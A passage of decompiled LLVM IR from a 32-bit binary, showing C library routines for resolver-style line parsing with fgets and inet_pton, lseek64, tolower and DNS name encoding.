dec_label_pc_80565c7:                             ; preds = %dec_label_pc_80565bb
  %v0_80565c7 = load i32, i32* @eax, align 4
  %v0_80565c9 = load i32, i32* @ebx, align 4
  %v1_80565c9 = inttoptr i32 %v0_80565c9 to i32*
  %v2_80565c9 = load i32, i32* %v1_80565c9, align 4
  %v5_80565cf = call i32 @__GI_strcoll(i8* %v2_80565e6, i32 %v2_80565c9, i32 %v0_80565c7, i32 %v0_80565c7)
  store i32 %v5_80565cf, i32* %eax.global-to-local, align 4
  %v1_80565d7 = icmp eq i32 %v5_80565cf, 0
  %v1_80565d9 = icmp eq i1 %v1_80565d7, false
  br i1 %v1_80565d9, label %dec_label_pc_8056643.backedge, label %dec_label_pc_80565f9

dec_label_pc_8056643.backedge:                    ; preds = %dec_label_pc_80565f2, %dec_label_pc_80565c7, %dec_label_pc_80565a0
  %v0_8056643 = load i32, i32* @edx, align 4
  %v3_805664d = call i32 @fgets(i32 %v4_8056649, i32 %stack_var_4.0, i32 %v0_8056643)
  store i32 %v3_805664d, i32* @eax, align 4
  %v1_8056655 = icmp eq i32 %v3_805664d, 0
  %v1_8056657 = icmp eq i1 %v1_8056655, false
  br i1 %v1_8056657, label %dec_label_pc_8056544, label %dec_label_pc_805665d

dec_label_pc_80565dd:                             ; preds = %dec_label_pc_80565dd.lr.ph, %dec_label_pc_80565f2
  %v1_80565df119 = phi i32 [ 1, %dec_label_pc_80565dd.lr.ph ], [ %v1_80565f2, %dec_label_pc_80565f2 ]
  %v0_80565df = load i32, i32* @ebx, align 4
  %v2_80565df = mul i32 %v1_80565df119, 4
  %v3_80565df = add i32 %v0_80565df, %v2_80565df
  %v4_80565df = inttoptr i32 %v3_80565df to i32*
  %v5_80565df = load i32, i32* %v4_80565df, align 4
  %v3_80565e6 = call i32 @__GI_strcasecmp(i8* %v2_80565e6, i32 %v5_80565df)
  store i32 %v3_80565e6, i32* %eax.global-to-local, align 4
  %v1_80565ee = icmp eq i32 %v3_80565e6, 0
  br i1 %v1_80565ee, label %dec_label_pc_80565f9, label %dec_label_pc_80565f2

dec_label_pc_80565f2:                             ; preds = %dec_label_pc_80565dd
  %v0_80565f2 = load i32, i32* @esi, align 4
  %v1_80565f2 = add i32 %v0_80565f2, 1
  store i32 %v1_80565f2, i32* @esi, align 4
  %v1_80565f3.pre = load i32, i32* @edi, align 4
  %v5_80565f5 = icmp slt i32 %v1_80565f2, %v1_80565f3.pre
  br i1 %v5_80565f5, label %dec_label_pc_80565dd, label %dec_label_pc_8056643.backedge

dec_label_pc_80565f9:                             ; preds = %dec_label_pc_80565c7, %dec_label_pc_80565dd
  br i1 %v1_80565fe, label %dec_label_pc_805661b, label %dec_label_pc_8056600

dec_label_pc_8056600:                             ; preds = %dec_label_pc_80565f9
  %v0_8056600 = load i32, i32* @esi, align 4
  %v3_8056601 = load i8*, i8** %stack_var_-44, align 4
  %v4_8056601 = ptrtoint i8* %v3_8056601 to i32
  %v0_8056605 = load i32, i32* @ebx, align 4
  %v1_8056605 = inttoptr i32 %v0_8056605 to i32*
  %v2_8056605 = load i32, i32* %v1_8056605, align 4
  %v4_8056609 = inttoptr i32 %v2_8056605 to i8*
  %v5_8056609 = call i32 @inet_pton(i32 2, i8* %v4_8056609, i32 %v4_8056601, i32 %v0_8056600)
  store i32 %v5_8056609, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8056609, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8056499, label %dec_label_pc_8056643.outer.backedge

dec_label_pc_8056643.outer.backedge:              ; preds = %dec_label_pc_8056600, %dec_label_pc_8056622, %dec_label_pc_805661b
  %v0_8056643120 = load i32, i32* @edx, align 4
  %v3_805664d121 = call i32 @fgets(i32 %v4_8056649, i32 %stack_var_4.0, i32 %v0_8056643120)
  store i32 %v3_805664d121, i32* @eax, align 4
  %v1_8056655122 = icmp eq i32 %v3_805664d121, 0
  %v1_8056657123 = icmp eq i1 %v1_8056655122, false
  br i1 %v1_8056657123, label %dec_label_pc_8056544.lr.ph, label %dec_label_pc_805665d

dec_label_pc_805661b:                             ; preds = %dec_label_pc_80565f9
  br i1 %v1_8056620, label %dec_label_pc_8056643.outer.backedge, label %dec_label_pc_8056622

dec_label_pc_8056622:                             ; preds = %dec_label_pc_805661b
  %v0_8056622 = load i32, i32* @ecx, align 4
  %v0_8056627 = load i32, i32* @ebx, align 4
  %v1_8056627 = inttoptr i32 %v0_8056627 to i32*
  %v2_8056627 = load i32, i32* %v1_8056627, align 4
  %v4_805662b = inttoptr i32 %v2_8056627 to i8*
  %v5_805662b = call i32 @inet_pton(i32 10, i8* %v4_805662b, i32 %stack_var_-36.0, i32 %v0_8056622)
  store i32 %v5_805662b, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_805662b, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_80564c6, label %dec_label_pc_8056643.outer.backedge

dec_label_pc_805665d:                             ; preds = %dec_label_pc_8056643.outer.backedge, %dec_label_pc_805652d, %dec_label_pc_8056643.backedge, %dec_label_pc_80564f2
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_80564f2 ], [ 1, %dec_label_pc_805652d ], [ 2, %dec_label_pc_8056643.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8056643.backedge ]
  br i1 %v12_80563ec, label %dec_label_pc_805667d, label %dec_label_pc_8056664

dec_label_pc_8056664:                             ; preds = %dec_label_pc_805665d
  %v1_805666b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_805666b = call i32 @__GI_fclose(i16* %v1_805666b)
  store i32 %v2_805666b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805667d

dec_label_pc_805667d:                             ; preds = %dec_label_pc_80565b0, %dec_label_pc_80563cd, %dec_label_pc_80563d9, %dec_label_pc_80563f7, %dec_label_pc_805640a, %dec_label_pc_8056416, %dec_label_pc_805641f, %dec_label_pc_8056449, %dec_label_pc_805665d, %dec_label_pc_8056664, %dec_label_pc_805647f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_805665d ], [ %stack_var_-28.1, %dec_label_pc_8056664 ], [ %v2_805648e, %dec_label_pc_805647f ], [ 34, %dec_label_pc_8056449 ], [ 34, %dec_label_pc_805641f ], [ 34, %dec_label_pc_8056416 ], [ 34, %dec_label_pc_805640a ], [ 34, %dec_label_pc_80563f7 ], [ 34, %dec_label_pc_80563d9 ], [ 34, %dec_label_pc_80563cd ], [ %stack_var_-28.0.ph131, %dec_label_pc_80565b0 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80563b8, i32* @ebx, align 4
  store i32 %v0_80563b7, i32* @esi, align 4
  store i32 %v0_80563b6, i32* @edi, align 4
  store i32 %v0_80563b5, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_80565f2, { 0, 2, 1 }
  uselistorder i8 %v2_805656795, { 1, 2, 0 }
  uselistorder i8* %v1_805656794, { 1, 0 }
  uselistorder i32 %v0_805656747, { 1, 0 }
  uselistorder i32 %v2_805658d, { 1, 0 }
  uselistorder i32 %v1_8056586, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056590.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805657b, { 1, 0 }
  uselistorder i32 %v0_805657b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805656d, { 1, 0 }
  uselistorder i8* %v2_80565e6, { 1, 0 }
  uselistorder i32 %v4_8056649, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_805640a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80563e5, { 1, 0 }
  uselistorder i32 %v1_80563c8, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 16, 24, 25, 26, 0, 15, 9, 10, 19, 11, 27, 28, 2, 4, 23, 5, 6, 20, 12, 7, 21, 8, 22, 13, 14, 17, 18, 3, 1 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 14, 0, 1, 13, 2, 22, 15, 16, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_80612cc, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 112, 0, 113, 21, 22, 114, 115, 3, 89, 88, 2, 116, 117, 6, 118, 4, 119, 5, 120, 136, 8, 91, 90, 7, 68, 69, 121, 70, 71, 72, 73, 74, 75, 145, 76, 41, 42, 43, 110, 146, 138, 139, 147, 128, 127, 9, 133, 134, 87, 122, 77, 78, 79, 80, 81, 10, 82, 83, 11, 84, 85, 86, 123, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 18, 19, 20, 111, 17, 124, 125, 126, 129, 131, 130, 132, 135, 12, 137, 144, 141, 14, 142, 15, 143, 13, 140, 16 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 10, { 20, 2, 32, 33, 34, 35, 36, 37, 3, 26, 27, 29, 28, 4, 8, 38, 9, 31, 11, 10, 21, 5, 13, 25, 30, 12, 40, 22, 0, 23, 24, 19, 18, 17, 14, 15, 1, 39, 6, 41, 42, 16, 7 }
  uselistorder i32 12, { 106, 107, 108, 0, 109, 20, 29, 110, 126, 24, 23, 6, 114, 7, 8, 9, 10, 11, 12, 13, 111, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 159, 28, 30, 105, 125, 31, 32, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 33, 34, 35, 36, 37, 38, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 25, 158, 115, 116, 117, 118, 160, 93, 1, 2, 94, 95, 14, 15, 96, 3, 112, 113, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 26, 73, 74, 75, 76, 77, 78, 79, 80, 81, 97, 98, 99, 21, 100, 101, 102, 103, 27, 22, 104, 19, 18, 17, 16, 119, 120, 121, 122, 123, 124, 5 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 2, 3, 4, 1 }
  uselistorder i32 56, { 7, 6, 12, 13, 14, 15, 16, 2, 9, 3, 10, 4, 1, 5, 17, 11, 8, 0 }
  uselistorder i32 44, { 10, 11, 12, 7, 8, 9, 23, 14, 15, 6, 20, 22, 21, 17, 18, 19, 16, 13, 2, 3, 1, 4, 5, 0 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 0, 1 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 19, 14, 4, 10, 5, 20, 21, 0, 11, 7, 6, 2, 13, 8, 9, 15, 16, 17, 18, 3, 1, 12 }
  uselistorder i32 -48, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 16, { 112, 111, 10, 113, 114, 30, 3, 115, 31, 116, 74, 75, 124, 125, 126, 127, 128, 129, 136, 130, 131, 132, 133, 134, 135, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 117, 118, 119, 120, 76, 77, 78, 79, 80, 81, 82, 83, 162, 32, 33, 48, 34, 69, 44, 51, 108, 52, 166, 11, 53, 54, 55, 0, 12, 155, 14, 13, 156, 1, 15, 147, 148, 40, 167, 121, 122, 84, 85, 86, 87, 88, 89, 2, 90, 91, 92, 93, 94, 16, 95, 96, 45, 97, 163, 164, 165, 123, 4, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 47, 35, 70, 71, 72, 73, 41, 36, 37, 98, 99, 46, 100, 101, 7, 8, 102, 103, 104, 105, 106, 38, 39, 107, 27, 28, 29, 25, 26, 23, 24, 18, 19, 20, 21, 22, 49, 50, 109, 110, 9, 42, 149, 150, 151, 152, 153, 5, 17, 43, 154, 6, 157, 158, 159, 160, 161 }
  uselistorder i32 8, { 153, 152, 154, 14, 15, 155, 156, 157, 158, 159, 160, 1, 161, 16, 10, 162, 163, 164, 48, 116, 51, 24, 25, 26, 27, 52, 28, 29, 30, 53, 31, 54, 32, 55, 56, 166, 117, 118, 119, 120, 121, 122, 49, 123, 124, 125, 227, 228, 45, 234, 46, 235, 47, 69, 33, 71, 151, 179, 72, 73, 181, 182, 183, 184, 185, 186, 187, 2, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 3, 74, 75, 76, 77, 78, 79, 80, 81, 198, 199, 200, 201, 202, 58, 4, 59, 5, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 57, 220, 221, 6, 222, 223, 224, 225, 7, 226, 173, 174, 17, 233, 167, 168, 18, 19, 70, 126, 127, 128, 129, 131, 132, 133, 130, 134, 135, 136, 137, 34, 35, 138, 139, 140, 141, 142, 143, 20, 229, 230, 231, 169, 170, 171, 172, 165, 232, 82, 83, 84, 85, 23, 60, 61, 62, 86, 87, 0, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 21, 103, 104, 105, 50, 106, 107, 63, 108, 109, 64, 110, 111, 112, 113, 114, 115, 65, 144, 145, 146, 147, 11, 148, 12, 66, 68, 36, 67, 149, 150, 44, 43, 42, 40, 41, 37, 38, 39, 13, 175, 176, 177, 178, 22, 180, 9, 8 }
  uselistorder i32 -32, { 15, 0, 1, 2, 13, 14, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 32, { 77, 27, 78, 79, 26, 32, 84, 47, 85, 86, 87, 45, 46, 62, 24, 95, 33, 54, 74, 75, 58, 25, 56, 57, 1, 0, 2, 3, 48, 4, 55, 5, 6, 7, 8, 9, 10, 28, 82, 80, 81, 63, 64, 29, 65, 66, 67, 68, 69, 70, 71, 11, 72, 73, 49, 93, 94, 83, 92, 59, 60, 61, 76, 36, 12, 50, 51, 13, 52, 30, 15, 14, 38, 37, 34, 31, 39, 16, 17, 19, 18, 40, 21, 20, 41, 43, 23, 22, 42, 88, 89, 90, 91, 44, 35, 53 }
  uselistorder i32 4, {}
  uselistorder i32* @ebp, { 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 10, 11, 12, 1, 13, 14, 15, 4, 77, 78, 79, 84, 80, 81, 82, 83, 85, 31, 32, 86, 90, 101, 102, 131, 132, 133, 33, 34, 35, 36, 37, 16, 17, 18, 60, 61, 162, 163, 164, 165, 166, 19, 20, 167, 168, 169, 170, 171, 172, 173, 174, 179, 175, 176, 177, 178, 3, 180, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 5, 38, 39, 40, 41, 42, 96, 2, 97, 98, 99, 100, 91, 92, 93, 94, 95, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0, 54, 7, 8, 9, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 116, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 55, 56, 57, 87, 88, 89, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 58, 59, 6, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 181, 182, 183, 184 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805667d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805665d, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8056643.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80565f9, { 1, 0 }
  uselistorder label %dec_label_pc_80565dd, { 1, 0 }
  uselistorder label %dec_label_pc_80565a0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8056567.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805658d, { 1, 0 }
  uselistorder label %dec_label_pc_805655b, { 1, 0 }
  uselistorder label %dec_label_pc_8056544, { 1, 0 }
  uselistorder label %dec_label_pc_8056544.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_805652d, { 1, 0 }
  uselistorder label %dec_label_pc_80564f2, { 1, 0 }
  uselistorder label %dec_label_pc_8056449, { 1, 0 }
  uselistorder label %dec_label_pc_80563d9, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805668e = load i32, i32* @ebx, align 4
  store i32 %v0_805668e, i32* %stack_var_-12, align 4
  %v2_80566a2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80566a2, i32* %esi.global-to-local, align 4
  %v1_80566b9 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80566b9, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80566b9, -4095
  br i1 %tmp18, label %dec_label_pc_80566d3, label %dec_label_pc_80566c5

dec_label_pc_80566c5:                             ; preds = %entry
  %v2_80566a6 = ashr i32 %arg3, 31
  %v1_80566c5 = call i32 @__errno_location(i32 %v2_80566a6)
  %v0_80566ca = load i32, i32* %esi.global-to-local, align 4
  %v1_80566ca = sub i32 0, %v0_80566ca
  %v2_80566cc = inttoptr i32 %v1_80566c5 to i32*
  store i32 %v1_80566ca, i32* %v2_80566cc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80566e7.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80566d7

dec_label_pc_80566d3:                             ; preds = %entry
  %v1_80566d3 = icmp eq i32 %v1_80566b9, 0
  br i1 %v1_80566d3, label %dec_label_pc_80566dc, label %dec_label_pc_80566d7

dec_label_pc_80566d7:                             ; preds = %dec_label_pc_80566d3, %dec_label_pc_80566c5
  %v2_80566e7.pre = phi i32 [ %v0_805668e, %dec_label_pc_80566d3 ], [ %v2_80566e7.pre.pre, %dec_label_pc_80566c5 ]
  %v0_80566d7 = phi i32 [ %v1_80566b9, %dec_label_pc_80566d3 ], [ -1, %dec_label_pc_80566c5 ]
  %v1_80566d9 = ashr i32 %v0_80566d7, 31
  br label %dec_label_pc_80566e4

dec_label_pc_80566dc:                             ; preds = %dec_label_pc_80566d3
  %v3_80566dc = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80566e4

dec_label_pc_80566e4:                             ; preds = %dec_label_pc_80566d7, %dec_label_pc_80566dc
  %v2_80566e7 = phi i32 [ %v2_80566e7.pre, %dec_label_pc_80566d7 ], [ %v0_805668e, %dec_label_pc_80566dc ]
  %v0_80566ea = phi i32 [ %v0_80566d7, %dec_label_pc_80566d7 ], [ %v3_80566dc, %dec_label_pc_80566dc ]
  %storemerge = phi i32 [ %v1_80566d9, %dec_label_pc_80566d7 ], [ %tmp, %dec_label_pc_80566dc ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_80566e7, i32* @ebx, align 4
  ret i32 %v0_80566ea

; uselistorder directives
  uselistorder i32 %v1_80566b9, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805668e, { 1, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 55, 42, 71, 70, 69, 41, 40, 54, 53, 39, 25, 36, 52, 51, 30, 44, 24, 64, 13, 12, 11, 10, 9, 68, 8, 23, 22, 7, 21, 47, 46, 57, 56, 67, 66, 65, 63, 20, 19, 45, 18, 35, 50, 49, 48, 0, 38, 37, 14, 43, 6, 5, 62, 32, 31, 61, 29, 4, 16, 1, 28, 15, 60, 59, 34, 27, 26, 58, 3, 2, 72, 33, 17 }
  uselistorder i32 31, { 21, 22, 16, 23, 24, 31, 32, 25, 26, 12, 2, 3, 0, 1, 11, 30, 17, 18, 19, 6, 7, 4, 5, 13, 8, 9, 27, 28, 20, 14, 15, 29, 33, 34, 35, 10, 36, 37, 38, 39, 40 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_80566e4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80566f0 = add i32 %arg1, 128
  %v6_80566fb = icmp ugt i32 %v1_80566f0, 383
  br i1 %v6_80566fb, label %dec_label_pc_8056706, label %dec_label_pc_80566fd

dec_label_pc_80566fd:                             ; preds = %entry
  %v0_80566fd = load i32, i32* bitcast (i32** @global_var_8061540.721 to i32*), align 64
  %v2_8056702 = mul i32 %arg1, 2
  %v3_8056702 = add i32 %v0_80566fd, %v2_8056702
  %v4_8056702 = inttoptr i32 %v3_8056702 to i16*
  %v5_8056702 = load i16, i16* %v4_8056702, align 2
  %v6_8056702 = sext i16 %v5_8056702 to i32
  store i32 %v6_8056702, i32* @edx, align 4
  br label %dec_label_pc_8056706

dec_label_pc_8056706:                             ; preds = %entry, %dec_label_pc_80566fd
  %v0_8056706 = phi i32 [ %arg1, %entry ], [ %v6_8056702, %dec_label_pc_80566fd ]
  ret i32 %v0_8056706

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 83, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 84, 87, 20, 21, 86, 22, 24, 23, 29, 25, 30, 26, 31, 27, 32, 28, 36, 33, 37, 34, 38, 35, 39, 40, 42, 41, 44, 43, 45, 49, 46, 50, 47, 51, 48, 52, 54, 53, 57, 55, 58, 56, 59, 60, 63, 61, 64, 62, 65, 66, 68, 67, 69, 70, 73, 74, 75, 71, 76, 72, 78, 77, 79, 81, 80, 82, 85 }
  uselistorder i32 128, { 19, 12, 14, 2, 3, 6, 13, 7, 8, 15, 4, 9, 10, 16, 0, 17, 18, 5, 1, 11, 20 }
  uselistorder label %dec_label_pc_8056706, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805670d = load i32, i32* @edi, align 4
  %v0_805670e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8056715 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056715, i32* @edi, align 4
  %v1_80567746 = icmp eq i8* %arg1, null
  br i1 %v1_80567746, label %dec_label_pc_805677d, label %dec_label_pc_8056778.lr.ph

dec_label_pc_8056778.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8056778

dec_label_pc_805671b:                             ; preds = %dec_label_pc_8056778
  %v5_8056720 = call i32 @__GI_strchr(i8* %v1_8056778, i32 46)
  %v1_805672a = icmp eq i32 %v5_8056720, 0
  br i1 %v1_805672a, label %dec_label_pc_8056734, label %dec_label_pc_805672e

dec_label_pc_805672e:                             ; preds = %dec_label_pc_805671b
  %v1_8056730 = load i32, i32* @edi, align 4
  %v2_8056730 = sub i32 %v5_8056720, %v1_8056730
  br label %dec_label_pc_8056742

dec_label_pc_8056734:                             ; preds = %dec_label_pc_805671b
  %v0_8056737 = load i32, i32* @edi, align 4
  %v5_8056737 = inttoptr i32 %v0_8056737 to i8*
  %v3_8056738 = call i32 @strlen(i8* %v5_8056737)
  br label %dec_label_pc_8056742

dec_label_pc_8056742:                             ; preds = %dec_label_pc_805672e, %dec_label_pc_8056734
  %v0_8056755 = phi i32 [ %v2_8056730, %dec_label_pc_805672e ], [ %v3_8056738, %dec_label_pc_8056734 ]
  store i32 %v0_8056755, i32* @esi, align 4
  %v1_8056742 = icmp eq i32 %v0_8056755, 0
  %v3_8056742 = trunc i32 %v0_8056755 to i8
  br i1 %v1_8056742, label %dec_label_pc_8056791, label %dec_label_pc_8056746

dec_label_pc_8056746:                             ; preds = %dec_label_pc_8056742
  %v1_805674a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805674a = sub i32 %arg3, %v1_805674a
  %v1_805674c = add i32 %v2_805674a, -1
  %v7_805674d = icmp ult i32 %v0_8056755, %v1_805674c
  %v1_805674f = icmp eq i1 %v7_805674d, false
  br i1 %v1_805674f, label %dec_label_pc_8056791, label %dec_label_pc_8056751

dec_label_pc_8056751:                             ; preds = %dec_label_pc_8056746
  store i32 %arg2, i32* @edx, align 4
  %v4_8056757 = add i32 %v1_805674a, %arg2
  %v5_8056757 = inttoptr i32 %v4_8056757 to i8*
  store i8 %v3_8056742, i8* %v5_8056757, align 1
  %v0_805675a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805675a = add i32 %v0_805675a, 1
  %v0_805675c = load i32, i32* @edx, align 4
  %v2_805675e = add i32 %v1_805675a, %v0_805675c
  %v0_8056760 = load i32, i32* @esi, align 4
  %v0_8056761 = load i32, i32* @edi, align 4
  %v2_8056763 = add i32 %v0_8056760, %v1_805675a
  store i32 %v2_8056763, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_805675e to i16*
  %v7_8056765 = call i32 @memcpy(i16* %tmp31, i32 %v0_8056761, i32 %v0_8056760)
  %v1_8056771 = add i32 %v5_8056720, 1
  br i1 %v1_805672a, label %dec_label_pc_805677d, label %dec_label_pc_8056774

dec_label_pc_8056774:                             ; preds = %dec_label_pc_8056751
  store i32 %v1_8056771, i32* @edi, align 4
  %v1_8056774 = icmp eq i32 %v1_8056771, 0
  br i1 %v1_8056774, label %dec_label_pc_805677d, label %dec_label_pc_8056778

dec_label_pc_8056778:                             ; preds = %dec_label_pc_8056778.lr.ph, %dec_label_pc_8056774
  %v0_805671f = phi i32 [ %v4_8056715, %dec_label_pc_8056778.lr.ph ], [ %v1_8056771, %dec_label_pc_8056774 ]
  %v1_8056778 = inttoptr i32 %v0_805671f to i8*
  %v2_8056778 = load i8, i8* %v1_8056778, align 1
  %v3_8056778 = icmp eq i8 %v2_8056778, 0
  %v1_805677b = icmp eq i1 %v3_8056778, false
  br i1 %v1_805677b, label %dec_label_pc_805671b, label %dec_label_pc_805677d

dec_label_pc_805677d:                             ; preds = %dec_label_pc_8056774, %dec_label_pc_8056778, %dec_label_pc_8056751, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_8056791, label %dec_label_pc_8056784

dec_label_pc_8056784:                             ; preds = %dec_label_pc_805677d
  %v1_8056788 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056788 = add i32 %v1_8056788, %arg2
  %v3_8056788 = inttoptr i32 %v2_8056788 to i8*
  store i8 0, i8* %v3_8056788, align 1
  %v0_805678c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805678c = add i32 %v0_805678c, 1
  br label %dec_label_pc_8056794

dec_label_pc_8056791:                             ; preds = %dec_label_pc_8056746, %dec_label_pc_8056742, %dec_label_pc_805677d
  br label %dec_label_pc_8056794

dec_label_pc_8056794:                             ; preds = %dec_label_pc_8056784, %dec_label_pc_8056791
  %storemerge4 = phi i32 [ %v1_805678c, %dec_label_pc_8056784 ], [ -1, %dec_label_pc_8056791 ]
  store i32 %v0_805670e, i32* @esi, align 4
  store i32 %v0_805670d, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8056778, { 1, 0 }
  uselistorder i32 %v1_8056771, { 0, 2, 1 }
  uselistorder i32 %v0_8056760, { 1, 0 }
  uselistorder i1 %v1_805672a, { 1, 0 }
  uselistorder i32 %v5_8056720, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 11, 12 }
  uselistorder i32 46, { 2, 5, 0, 6, 1, 3, 4 }
